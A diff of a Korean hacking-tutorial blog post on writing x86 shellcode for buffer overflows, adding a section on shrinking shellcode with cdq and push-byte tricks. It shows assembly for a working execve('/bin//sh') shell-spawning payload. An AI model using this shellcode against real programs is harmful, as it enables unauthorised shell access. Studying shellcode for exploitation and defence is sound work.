@@ -1,7 +1,7 @@
 ---
 title : 쉘코드 만들기
 categories : [Hacking, System]
-tags : [BOF, shellcode 만들기, shellcode, system call]
+tags : [BOF, shellcode 만들기, shellcode, system call, execve, seteuid, setegid, setreuid, setreguid, nasm]
 ---
 
 ## Shellcode
@@ -354,14 +354,14 @@ int main() // main(int argc, char *argv[], char *envp[])
 어셈블리에서 메모리르 다루는 방법은 C에서 포인터를 사용하는 방법과 비슷한데 어셈블리 명령어로 ```lea <dest> <src>```가 있다.
 : src 오퍼랜드의 유효 주소를 dest 오퍼랜드에 로드한다.
 
-인텔 문법으로 오퍼랜드는 각괄호로 둘러싸여 포인터로 디레퍼런스될 수 있다. ```ex) mov [ebx+12], eax -> ebx+12가 가리키는 곳에 eax를 쓴다```
+인텔 문법으로 오퍼랜드는 각괄호로 둘러싸여 포인터로 디레퍼런스될 수 있다.    
+```ex) mov [ebx+12], eax -> ebx+12가 가리키는 곳에 eax를 쓴다```
 
 위의 코드를 어셈블리어로 작성하면 아래와 같다.
 
 <br>
 
 ```assembly
-
 jmp short two
   
 one:
@@ -386,12 +386,13 @@ two:
 이 코드를 어셈블하면 36바이트의 셸코드가 생성된다. 36바이트에서 더 줄일 수 있는 방법이 있다.
 
 
-ESP 레지스터는 스택의 맨 위를 가리키는 스택 포인터다. 스택에 값이 푸쉬될 때 ESP는 메모리상에서 위로 옮겨지고 스택 맨 위에 그 값이 위치한다.   
+ESP 레지스터는 스택의 맨 위를 가리키는 스택 포인터다.    
+스택에 값이 푸쉬될 때 ESP는 메모리상에서 위로 옮겨지고 스택 맨 위에 그 값이 위치한다.   
 스택에서 값을 팝할 때 ESP는 메모리에서 아래로 옮겨진다.  
 
 <br>
 
-```assembly
+```nasm
 ; execve(const char *filename, char *const argv[], char *const envp[])
 xor eax, eax
 push eax          ; 널 바이트 삽입
@@ -403,7 +404,7 @@ mov edx, esp      ; envp
 push ebx          ; 문자열 주소 삽입
 mov ecx, esp      ; argv
 mov al, 11 
-int 0x80
+int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
 ```
 
 <br>
@@ -414,7 +415,7 @@ jmp call 방법과 비교했을 때 25바이트 밖에 안된다. 2바이트 더
 
 <br>
 
-```assembly
+```nasm
 xor eax, eax
 push eax
 push 0x68732f2f
@@ -434,4 +435,56 @@ int 0x80
 <hr style="border: 2px solid;">
 <br><br>
 
-## 권한
+## 셸코드 크기 줄이기
+<hr style="border-top: 1px solid;"><br>
+
+**cdq**<sub>Convert Doubleword to Quadword</sub>라는 단일 바이트 x86 명령이 있다.
+
+오퍼랜드를 사용하지 않고, 이 명령은 항상 EAX 레지스터 값을 EDX 레지스터와 EAX 레지스터 사이에 저장한다.
+
+레지스터는 32비트 더블워드이므로 64비트 쿼드워드를 저장하려면 두 개의 레지스터가 필요하다.
+
+변환은 단순히 부호 비트를 32비트 정수에서 64비트 정수로 확장하는 문제다.
+
+동작상 EAX의 부호 비트가 0이면, cdq 명령이 EDX 레지스터도 0으로 만든다.   
+```xor edx, edx```보다 ```cdq```를 사용하면 한 바이트를 줄일 수 있다.
+
+<br>
+
+스택은 32비트로 맞춰져있으므로 스택에 푸쉬된 단일 바이트 값은 더블워드로 맞춰진다.
+
+단일 바이트 값을 푸쉬하고 팝하여 레지스터에 저장하는 명령은 세 바이트다.
+
+<br>
+
+```nasm
+push byte 11
+pop eax
+```
+
+<br>
+
+**단일 바이트를 푸쉬할 때 크기를 정해줘야 한다.** 
+
+  + 한 바이트는 BYTE
+
+  + 두 바이트는 WORD
+
+  + 네 바이트는 DWORD
+
+<br>
+
+이 크기로 레지스터의 너비가 정해진다. 그래서 아래 코드에서는 al 레지스터의 크기가 BYTE로 정해졌다.
+
+<br>
+
+```
+mov BYTE al, 164
+
+push BYTE 11
+pop eax
+```
+
+<br><br>
+<hr style="border: 2px solid;">
+<br><br>
